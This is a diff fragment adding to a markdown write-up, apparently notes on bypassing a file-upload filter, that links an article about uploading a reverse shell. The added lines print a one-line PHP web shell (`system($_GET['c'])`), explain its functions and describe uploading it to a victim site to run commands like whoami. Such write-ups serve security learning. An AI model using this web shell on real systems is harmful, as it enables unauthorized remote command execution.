@@ -285,4 +285,12 @@ https://infosecwriteups.com/bypassed-and-uploaded-a-sweet-reverse-shell-d15e1bbf
 Very very sad.
 
 ## Attempt 2
+ This was the payload I was working with `<?php system($_GET[‘c’]);?>`.
+
+ [system](https://www.php.net/manual/en/function.system.php) — Execute an external program and display the output
+ 
+[$_GET](https://www.php.net/manual/en/reserved.variables.get.php) An associative array of variables passed to the current script via the URL parameters (aka. query string).
+
+ Our goal will be to upload this to the victim site and execute something along the lines of `example.com/upload/test.php?c=whoami`
+
  
